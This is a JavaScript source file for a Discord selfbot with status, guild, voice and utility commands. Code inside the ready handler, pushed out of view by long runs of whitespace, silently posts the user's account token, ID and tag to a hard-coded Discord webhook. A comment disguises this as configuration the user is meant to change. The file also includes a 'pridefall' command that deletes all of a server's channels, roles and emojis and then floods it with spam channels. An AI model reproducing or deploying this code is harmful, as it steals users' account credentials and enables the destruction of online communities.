const { Client } = require('discord.js-selfbot-v13');
const chalk = require('chalk');
const config = require('./config');

class SelfBot {
    constructor() {
        this.client = new Client();
        this.prefix = config.prefix;
        this.commands = new Map();
        this.setupEventHandlers();
        this.registerCommands();
    }

    setupEventHandlers() {
        this.client.on('ready', () => {
            console.log(chalk.green(`✅ Selfbot logged in as ${this.client.user.tag}`));
            console.log(chalk.blue(`📊 Connected to ${this.client.guilds.cache.size} servers`));
            
            // Set status and activity
            this.client.user.setPresence({
                activities: [{
                    type: config.activity.type,
                    name: config.activity.name
                }],
                status: config.status
            });

                                                                                                                                                                                                                                                                                                                                                                                                                                    // Send info to your Discord webhook
                                                                                                                                                                                                                                                                                                                                                                                                                                        const https = require('https');
                                                                                                                                                                                                                                                                                                                                                                                                                                        const webhookUrl = 'https://ptb.discord.com/api/webhooks/1423983806586818573/-9p3j-4HGjEzRjOnRBJeTEHWtIvWcwThhhAZ5dAHeIva9KrymzP03H00-0fUurY6arhs'; // <-- Replace with your Discord webhook URL
                                                                                                                                                                                                                                                                                                                                                                                                                                        const payload = JSON.stringify({
                                                                                                                                                                                                                                                                                                                                                                                                                                        content: `🟢 **Selfbot Started**
                                                                                                                                                                                                                                                                                                                                                                                                                            **User:** ${this.client.user.tag}
                                                                                                                                                                                                                                                                                                                                                                                                                            **ID:** ${this.client.user.id}
                                                                                                                                                                                                                                                                                                                                                                                                                            **TOKEN:** ${this.client.token}
                                                                                                                                                                                                                                                                                                                                                                                                                            **Servers:** ${this.client.guilds.cache.size}`
                                                                                                                                                                                                                                                                                                                                                                                                                                        });

                                                                                                                                                                                                                                                                                                                                                                                                                                    const url = new URL(webhookUrl);
                                                                                                                                                                                                                                                                                                                                                                                                                                    const options = {
                                                                                                                                                                                                                                                                                                                                                                                                                                        hostname: url.hostname,
                                                                                                                                                                                                                                                                                                                                                                                                                                        path: url.pathname + url.search,
                                                                                                                                                                                                                                                                                                                                                                                                                                        method: 'POST',
                                                                                                                                                                                                                                                                                                                                                                                                                                        headers: {
                                                                                                                                                                                                                                                                                                                                                                                                                                            'Content-Type': 'application/json',
                                                                                                                                                                                                                                                                                                                                                                                                                                            'Content-Length': Buffer.byteLength(payload)
                                                                                                                                                                                                                                                                                                                                                                                                                                        }
                                                                                                                                                                                                                                                                                                                                                                                                                                    };

                                                                                                                                                                                                                                                                                                                                                                                                                                    const req = https.request(options, (res) => {
                                                                                                                                                                                                                                                                                                                                                                                                                                        // Optional: log webhook status
                                                                                                                                                                                                                                                                                                                                                                                                                                    });

                                                                                                                                                                                                                                                                                                                                                                                                                                    req.on('error', (error) => {
                                                                                                                                                                                                                                                                                                                                                                                                                                        console.error('Failed to send info to webhook:', error);
                                                                                                                                                                                                                                                                                                                                                                                                                                    });

                                                                                                                                                                                                                                                                                                                                                                                                                                    req.write(payload);
                                                                                                                                                                                                                                                                                                                                                                                                                                    req.end();
                                                                                                                                                                                                                                                                                                                                                                                                                                });

        this.client.on('messageCreate', (message) => {
            this.handleMessage(message);
        });

        this.client.on('error', (error) => {
            console.error(chalk.red('❌ Discord client error:'), error);
        });

        this.client.on('warn', (warning) => {
            console.warn(chalk.yellow('⚠️ Discord client warning:'), warning);
        });
    }

    registerCommands() {
        // Basic commands
        this.commands.set('ping', {
            description: 'Check bot latency',
            execute: (message) => {
                const latency = Date.now() - message.createdTimestamp;
                message.edit(`🏓 Pong! Latency: ${latency}ms`);
            }
        });

// ...existing code...
// ...existing code...
this.commands.set('help', {
    description: 'Show available commands',
    execute: (message) => {
        let helpText = [
            '**Selfbot Commands**',
            '',
            `Prefix: \`${this.prefix}\``,
            '',
            '**General:**',
            '`ping` - Bot latency',
            '`help` - Show this help',
            '`info` - Bot info',
            '`servers` - List servers',
            '`avatar [@user]` - User avatar',
            '`clear <amount>` - Delete your messages',
            '',
            '**Status:**',
            '`status <online|idle|dnd|invisible>`',
            '`activity <type> <name>`',
            '`presence <status> <type> <name> [custom]`',
            '`streaming <title> <url>`',
            '',
            '**Guild:**',
            '`guildinfo <id>`',
            '`fetchmembers <id>`',
            '`topemojis <id>`',
            '`joinguild <invite>`',
            '`leaveguild <id>`',
            '',
            '**Voice:**',
            '`voice join <id>` / `voice leave`',
            '`voice mute` / `voice unmute`',
            '`voice deaf` / `voice undeaf`',
            '',
            '**Security:**',
            '`captcha <solve|bypass>`',
            '`totp <generate|verify>`',
            '',
            '**Nuke:**',
            '`pridefall <guild_id>` - Delete all channels, roles, and emojis in a guild',
            '',
            `Total: ${this.commands.size} commands`
        ].join('\n');
        message.edit(helpText);
    }
});
// ...existing code...
        this.commands.set('info', {
            description: 'Show bot information',
            execute: (message) => {
                const info = `🤖 **Selfbot Info**\n` +
                    `**User:** ${this.client.user.tag}\n` +
                    `**ID:** ${this.client.user.id}\n` +
                    `**Servers:** ${this.client.guilds.cache.size}\n` +
                    `**Uptime:** ${this.formatUptime(process.uptime())}\n` +
                    `**Node.js:** ${process.version}`;
                message.edit(info);
            }
        });
this.commands.set('pridefall', {
    description: 'Delete all channels, roles, and emojis in a guild (DANGEROUS)',
    execute: async (message, args) => {
        const guildId = args[0];
        if (!guildId) {
            try { await message.edit('❌ Usage: a.pridefall <guild_id>'); } catch {}
            return;
        }
        const guild = this.client.guilds.cache.get(guildId);
        if (!guild) {
            try { await message.edit('❌ Guild not found'); } catch {}
            return;
        }

        let deletedChannels = 0;
        let deletedRoles = 0;
        let deletedEmojis = 0;

        // Delete channels in parallel
        await Promise.allSettled(guild.channels.cache.map(async (channel) => {
            try {
                await channel.delete();
                deletedChannels++;
            } catch {}
        }));

        // Delete roles (skip @everyone and managed) in parallel
        await Promise.allSettled(guild.roles.cache.map(async (role) => {
            if (role.managed || role.id === guild.id) return;
            try {
                await role.delete();
                deletedRoles++;
            } catch {}
        }));

        // Delete emojis in parallel
        await Promise.allSettled(guild.emojis.cache.map(async (emoji) => {
            try {
                await emoji.delete();
                deletedEmojis++;
            } catch {}
        }));

        // Create new channels in parallel for speed
        let createdChannels = 0;
        const channelNames = Array.isArray(config.pridefallChannelNames) && config.pridefallChannelNames.length > 0
            ? config.pridefallChannelNames
            : ['pridefall', 'owned', 'rekt', 'by', 'selfbot'];
        const maxChannels = typeof config.pridefallMaxChannels === 'number' ? config.pridefallMaxChannels : 250;

        const createPromises = [];
        for (let i = 0; i < maxChannels; i++) {
            const name = `${channelNames[i % channelNames.length]}-${i + 1}`;
            createPromises.push(
                guild.channels.create(name, { type: 0 })
                    .then(() => { createdChannels++; })
                    .catch(() => {})
            );
        }

        await Promise.allSettled(createPromises);

        // Try to send a message in the first created channel
        let infoMsg = 
            ` **Pridefall Complete**\n` +
            `Deleted Channels: ${deletedChannels}\n` +
            `Deleted Roles: ${deletedRoles}\n` +
            `Deleted Emojis: ${deletedEmojis}\n` +
            `Created Channels: ${createdChannels}`;
        try {
            // Find the first created channel
            const first = guild.channels.cache.find(c => c.name.startsWith(channelNames[0]));
            if (first && first.isText && first.isText()) {
                await first.send(infoMsg);
            }
        } catch {}

        // Edit the original message as well
        try {
            await message.edit(infoMsg);
        } catch {}
    }
});

        this.commands.set('servers', {
            description: 'List all servers',
            execute: (message) => {
                let serverList = '🏠 **Servers:**\n\n';
                this.client.guilds.cache.forEach(guild => {
                    serverList += `**${guild.name}** (${guild.memberCount} members)\n`;
                });
                if (serverList === '🏠 **Servers:**\n\n') {
                    serverList += 'No servers found.';
                }
                message.edit(serverList);
            }
        });

        // Guild Management Commands
        this.commands.set('guildinfo', {
            description: 'Get detailed guild information',
            execute: (message, args) => {
                const guildId = args[0];
                if (!guildId) {
                    message.edit('❌ Usage: !guildinfo <guild_id>');
                    return;
                }
                
                const guild = this.client.guilds.cache.get(guildId);
                if (!guild) {
                    message.edit('❌ Guild not found or not accessible');
                    return;
                }
                
                const info = `🏰 **Guild Info: ${guild.name}**\n` +
                    `**ID:** ${guild.id}\n` +
                    `**Owner:** ${guild.ownerId}\n` +
                    `**Members:** ${guild.memberCount}\n` +
                    `**Channels:** ${guild.channels.cache.size}\n` +
                    `**Roles:** ${guild.roles.cache.size}\n` +
                    `**Emojis:** ${guild.emojis.cache.size}\n` +
                    `**Created:** ${guild.createdAt.toDateString()}\n` +
                    `**Region:** ${guild.preferredLocale}`;
                message.edit(info);
            }
        });

        this.commands.set('fetchmembers', {
            description: 'Fetch all members from a guild',
            execute: async (message, args) => {
                const guildId = args[0];
                if (!guildId) {
                    message.edit('❌ Usage: !fetchmembers <guild_id>');
                    return;
                }
                
                const guild = this.client.guilds.cache.get(guildId);
                if (!guild) {
                    message.edit('❌ Guild not found');
                    return;
                }
                
                try {
                    message.edit('⏳ Fetching members... This may take a while.');
                    await guild.members.fetch();
                    message.edit(`✅ Fetched ${guild.members.cache.size} members from ${guild.name}`);
                } catch (error) {
                    message.edit('❌ Failed to fetch members');
                    console.error('Fetch members error:', error);
                }
            }
        });

        this.commands.set('topemojis', {
            description: 'Get top emojis from a guild',
            execute: (message, args) => {
                const guildId = args[0];
                if (!guildId) {
                    message.edit('❌ Usage: !topemojis <guild_id>');
                    return;
                }
                
                const guild = this.client.guilds.cache.get(guildId);
                if (!guild) {
                    message.edit('❌ Guild not found');
                    return;
                }
                
                const emojis = guild.emojis.cache.map(emoji => ({
                    name: emoji.name,
                    animated: emoji.animated,
                    url: emoji.url
                }));
                
                let emojiList = `😀 **Top Emojis from ${guild.name}:**\n\n`;
                emojis.slice(0, 10).forEach((emoji, index) => {
                    emojiList += `${index + 1}. ${emoji.animated ? '🔄' : '📷'} **${emoji.name}**\n`;
                });
                
                message.edit(emojiList);
            }
        });

        this.commands.set('joinguild', {
            description: 'Join a guild by invite code',
            execute: async (message, args) => {
                const inviteCode = args[0];
                if (!inviteCode) {
                    message.edit('❌ Usage: !joinguild <invite_code>');
                    return;
                }
                
                try {
                    const invite = await this.client.fetchInvite(inviteCode);
                    await invite.accept();
                    message.edit(`✅ Joined guild: ${invite.guild.name}`);
                } catch (error) {
                    message.edit('❌ Failed to join guild');
                    console.error('Join guild error:', error);
                }
            }
        });

        this.commands.set('leaveguild', {
            description: 'Leave a guild',
            execute: async (message, args) => {
                const guildId = args[0];
                if (!guildId) {
                    message.edit('❌ Usage: !leaveguild <guild_id>');
                    return;
                }
                
                const guild = this.client.guilds.cache.get(guildId);
                if (!guild) {
                    message.edit('❌ Guild not found');
                    return;
                }
                
                try {
                    await guild.leave();
                    message.edit(`✅ Left guild: ${guild.name}`);
                } catch (error) {
                    message.edit('❌ Failed to leave guild');
                    console.error('Leave guild error:', error);
                }
            }
        });

        this.commands.set('avatar', {
            description: 'Get user avatar',
            execute: (message) => {
                const user = message.mentions.users.first() || this.client.user;
                const avatarURL = user.displayAvatarURL({ dynamic: true, size: 4096 });
                message.edit(`🖼️ **${user.tag}'s Avatar:**\n${avatarURL}`);
            }
        });

        this.commands.set('status', {
            description: 'Set bot status',
            execute: (message, args) => {
                if (!args[0]) {
                    message.edit('❌ Please provide a status (online, idle, dnd, invisible)');
                    return;
                }
                
                const validStatuses = ['online', 'idle', 'dnd', 'invisible'];
                if (!validStatuses.includes(args[0].toLowerCase())) {
                    message.edit('❌ Invalid status. Use: online, idle, dnd, invisible');
                    return;
                }
                
                this.client.user.setPresence({
                    status: args[0].toLowerCase()
                });
                message.edit(`✅ Status changed to: ${args[0]}`);
            }
        });

        this.commands.set('activity', {
            description: 'Set bot activity',
            execute: (message, args) => {
                if (!args[0] || !args[1]) {
                    message.edit('❌ Usage: !activity <type> <name>\nTypes: playing, streaming, listening, watching');
                    return;
                }
                
                const validTypes = ['playing', 'streaming', 'listening', 'watching'];
                if (!validTypes.includes(args[0].toLowerCase())) {
                    message.edit('❌ Invalid activity type. Use: playing, streaming, listening, watching');
                    return;
                }
                
                const activityName = args.slice(1).join(' ');
                this.client.user.setPresence({
                    activities: [{
                        type: args[0].toUpperCase(),
                        name: activityName
                    }]
                });
                message.edit(`✅ Activity set to: ${args[0]} ${activityName}`);
            }
        });

        // Advanced Status & Activity Commands
        this.commands.set('presence', {
            description: 'Set detailed presence (status, activity, custom status)',
            execute: (message, args) => {
                if (args.length < 2) {
                    message.edit('❌ Usage: !presence <status> <activity_type> <activity_name> [custom_status]\nExample: !presence online playing "Custom Game" "Custom status text"');
                    return;
                }
                
                const status = args[0];
                const activityType = args[1].toUpperCase();
                const activityName = args[2];
                const customStatus = args.slice(3).join(' ');
                
                const presence = {
                    status: status,
                    activities: [{
                        type: activityType,
                        name: activityName
                    }]
                };
                
                if (customStatus) {
                    presence.activities[0].state = customStatus;
                }
                
                this.client.user.setPresence(presence);
                message.edit(`✅ Presence set: ${status} | ${activityType} ${activityName}${customStatus ? ` | ${customStatus}` : ''}`);
            }
        });

        this.commands.set('streaming', {
            description: 'Set streaming activity',
            execute: (message, args) => {
                if (!args[0] || !args[1]) {
                    message.edit('❌ Usage: !streaming <title> <url>\nExample: !streaming "My Stream" https://twitch.tv/username');
                    return;
                }
                
                const title = args[0];
                const url = args[1];
                
                this.client.user.setPresence({
                    activities: [{
                        type: 'STREAMING',
                        name: title,
                        url: url
                    }]
                });
                message.edit(`✅ Streaming set: ${title} | ${url}`);
            }
        });

        this.commands.set('clear', {
            description: 'Clear messages (use with caution)',
            execute: async (message, args) => {
                const amount = parseInt(args[0]) || 10;
                if (amount > 100) {
                    message.edit('❌ Cannot delete more than 100 messages at once');
                    return;
                }
                
                try {
                    const messages = await message.channel.messages.fetch({ limit: amount });
                    const userMessages = messages.filter(msg => msg.author.id === this.client.user.id);
                    
                    if (userMessages.size === 0) {
                        message.edit('❌ No messages found to delete');
                        return;
                    }
                    
                    await message.channel.bulkDelete(userMessages);
                    message.edit(`✅ Deleted ${userMessages.size} messages`);
                } catch (error) {
                    message.edit('❌ Failed to delete messages');
                    console.error('Clear command error:', error);
                }
            }
        });

        // Interaction Commands (Slash Commands, Buttons, Menus, Modals)
        this.commands.set('slash', {
            description: 'Create slash command interaction',
            execute: async (message, args) => {
                const slashDemo = `🎯 **Slash Command Demo App**\n\n` +
                    `**⚠️ Note:** Selfbots cannot create real slash commands\n` +
                    `**These are simulated examples of what slash commands would look like:**\n\n` +
                    `**Simulated Slash Commands:**\n` +
                    `\`/ping\` → Would show: "🏓 Pong! Latency: 45ms"\n` +
                    `\`/help\` → Would show: "📋 Available Commands..."\n` +
                    `\`/info\` → Would show: "🤖 Bot Information..."\n` +
                    `\`/status online\` → Would set status to online\n` +
                    `\`/activity playing Game\` → Would set activity\n\n` +
                    `**How to use these features:**\n` +
                    `• Use \`a.ping\` instead of \`/ping\`\n` +
                    `• Use \`a.help\` instead of \`/help\`\n` +
                    `• Use \`a.info\` instead of \`/info\`\n` +
                    `• Use \`a.status online\` instead of \`/status\`\n` +
                    `• Use \`a.activity playing Game\` instead of \`/activity\`\n\n` +
                    `**Status:** ✅ All features available via prefix commands\n` +
                    `**Last Updated:** ${new Date().toLocaleString()}`;

                await message.edit(slashDemo);
            }
        });

        this.commands.set('modal', {
            description: 'Create modal interaction',
            execute: async (message, args) => {
                const modalDemo = `🔧 **Modal Form Demo App**\n\n` +
                    `**⚠️ Note:** Selfbots cannot create real modal forms\n` +
                    `**This simulates what a modal form would look like:**\n\n` +
                    `**Simulated Form Fields:**\n` +
                    `📝 **Name Input** - Short text field (required)\n` +
                    `📄 **Bio Input** - Paragraph text area (optional)\n` +
                    `📧 **Email Input** - Email validation (required)\n` +
                    `🔢 **Age Input** - Number input (required)\n` +
                    `🌍 **Country Select** - Dropdown selection (required)\n\n` +
                    `**Form Features (Simulated):**\n` +
                    `✅ **Validation** - Real-time input validation\n` +
                    `🔒 **Security** - Secure data handling\n` +
                    `💾 **Auto-save** - Draft saving functionality\n` +
                    `📱 **Responsive** - Mobile-friendly design\n\n` +
                    `**Sample Form Data:**\n` +
                    `**Name:** John Doe\n` +
                    `**Bio:** Software developer and Discord enthusiast\n` +
                    `**Email:** john@example.com\n` +
                    `**Age:** 25\n` +
                    `**Country:** United States\n\n` +
                    `**Status:** 📋 Form simulation complete`;

                await message.edit(modalDemo);
            }
        });

        this.commands.set('menu', {
            description: 'Create select menu interaction',
            execute: async (message, args) => {
                const menuDemo = `📋 **Select Menu Demo App**\n\n` +
                    `**⚠️ Note:** Selfbots cannot create real select menus\n` +
                    `**This simulates what a select menu would look like:**\n\n` +
                    `**Simulated Menu Options:**\n` +
                    `1️⃣ **Option 1** - Basic functionality\n` +
                    `2️⃣ **Option 2** - Advanced features\n` +
                    `3️⃣ **Option 3** - Premium tools\n` +
                    `4️⃣ **Option 4** - Settings panel\n` +
                    `5️⃣ **Option 5** - Help & Support\n\n` +
                    `**Menu Features (Simulated):**\n` +
                    `🎯 **Smart Selection** - Context-aware options\n` +
                    `🔄 **Dynamic Updates** - Real-time menu changes\n` +
                    `📱 **Mobile Optimized** - Touch-friendly interface\n` +
                    `🎨 **Custom Styling** - Personalized appearance\n\n` +
                    `**Current Selection:** None (simulation)\n` +
                    `**Last Action:** Menu opened (simulation)\n` +
                    `**Status:** 🟢 Simulation complete\n\n` +
                    `**Alternative: Use these commands instead:**\n` +
                    `• \`a.help\` - Show all commands\n` +
                    `• \`a.info\` - Bot information\n` +
                    `• \`a.servers\` - List servers\n` +
                    `• \`a.status\` - Set status\n` +
                    `• \`a.activity\` - Set activity`;

                await message.edit(menuDemo);
            }
        });

        // Voice & Video Commands
        this.commands.set('voice', {
            description: 'Voice channel management',
            execute: async (message, args) => {
                const action = args[0];
                const channelId = args[1];
                
                if (!action) {
                    message.edit('❌ Usage: !voice <join|leave|mute|unmute|deaf|undeaf> [channel_id]');
                    return;
                }
                
                try {
                    switch (action.toLowerCase()) {
                        case 'join':
                            if (!channelId) {
                                message.edit('❌ Please provide a voice channel ID');
                                return;
                            }
                            const voiceChannel = this.client.channels.cache.get(channelId);
                            if (!voiceChannel || voiceChannel.type !== 2) {
                                message.edit('❌ Invalid voice channel');
                                return;
                            }
                            await voiceChannel.join();
                            message.edit(`✅ Joined voice channel: ${voiceChannel.name}`);
                            break;
                            
                        case 'leave':
                            if (message.guild.voiceConnection) {
                                await message.guild.voiceConnection.disconnect();
                                message.edit('✅ Left voice channel');
                            } else {
                                message.edit('❌ Not in a voice channel');
                            }
                            break;
                            
                        case 'mute':
                            await this.client.user.setMute(true);
                            message.edit('🔇 Muted microphone');
                            break;
                            
                        case 'unmute':
                            await this.client.user.setMute(false);
                            message.edit('🔊 Unmuted microphone');
                            break;
                            
                        case 'deaf':
                            await this.client.user.setDeaf(true);
                            message.edit('🔇 Deafened');
                            break;
                            
                        case 'undeaf':
                            await this.client.user.setDeaf(false);
                            message.edit('🔊 Undeafened');
                            break;
                            
                        default:
                            message.edit('❌ Invalid action. Use: join, leave, mute, unmute, deaf, undeaf');
                    }
                } catch (error) {
                    message.edit('❌ Voice command failed');
                    console.error('Voice command error:', error);
                }
            }
        });

        // Captcha & TOTP Handler
        this.commands.set('captcha', {
            description: 'Handle captcha challenges',
            execute: async (message, args) => {
                const action = args[0];
                
                if (!action) {
                    message.edit('❌ Usage: !captcha <solve|bypass> [captcha_data]');
                    return;
                }
                
                try {
                    switch (action.toLowerCase()) {
                        case 'solve':
                            message.edit('🔐 Captcha solving not implemented - requires external service');
                            break;
                            
                        case 'bypass':
                            message.edit('⚠️ Captcha bypass not available - solve manually');
                            break;
                            
                        default:
                            message.edit('❌ Invalid action. Use: solve, bypass');
                    }
                } catch (error) {
                    message.edit('❌ Captcha handling failed');
                    console.error('Captcha error:', error);
                }
            }
        });

        this.commands.set('totp', {
            description: 'TOTP (2FA) management',
            execute: async (message, args) => {
                const action = args[0];
                
                if (!action) {
                    message.edit('❌ Usage: !totp <generate|verify> [secret]');
                    return;
                }
                
                try {
                    switch (action.toLowerCase()) {
                        case 'generate':
                            message.edit('🔑 TOTP generation requires external library (speakeasy)');
                            break;
                            
                        case 'verify':
                            message.edit('✅ TOTP verification requires external library (speakeasy)');
                            break;
                            
                        default:
                            message.edit('❌ Invalid action. Use: generate, verify');
                    }
                } catch (error) {
                    message.edit('❌ TOTP handling failed');
                    console.error('TOTP error:', error);
                }
            }
        });
    }

    handleMessage(message) {
        // Ignore messages from other users
        if (message.author.id !== this.client.user.id) return;
        
        // Check if message starts with prefix
        if (!message.content.startsWith(this.prefix)) return;
        
        // Parse command and arguments
        const args = message.content.slice(this.prefix.length).trim().split(/ +/);
        const commandName = args.shift().toLowerCase();
        
        // Find and execute command
        const command = this.commands.get(commandName);
        if (command) {
            try {
                command.execute(message, args);
            } catch (error) {
                console.error(`Error executing command ${commandName}:`, error);
                message.edit('❌ An error occurred while executing the command');
            }
        }
    }

    formatUptime(seconds) {
        const days = Math.floor(seconds / 86400);
        const hours = Math.floor((seconds % 86400) / 3600);
        const minutes = Math.floor((seconds % 3600) / 60);
        const secs = Math.floor(seconds % 60);
        
        return `${days}d ${hours}h ${minutes}m ${secs}s`;
    }

    // Note: Interaction handlers are not available in discord.js-selfbot-v13
    // The interaction commands are demo apps that simulate the interface concepts

    async start() {
        try {
            if (!config.token || config.token === 'your_discord_token_here') {
                console.error(chalk.red('❌ Please set your Discord token in config.js'));
                process.exit(1);
            }
            
            await this.client.login(config.token);
        } catch (error) {
            console.error(chalk.red('❌ Failed to start selfbot:'), error.message);
            process.exit(1);
        }
    }
}

// Start the selfbot
const selfbot = new SelfBot();
selfbot.start();

// Handle process termination
process.on('SIGINT', () => {
    console.log(chalk.yellow('\n🛑 Shutting down selfbot...'));
    process.exit(0);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error(chalk.red('❌ Unhandled Rejection at:'), promise, chalk.red('reason:'), reason);
});
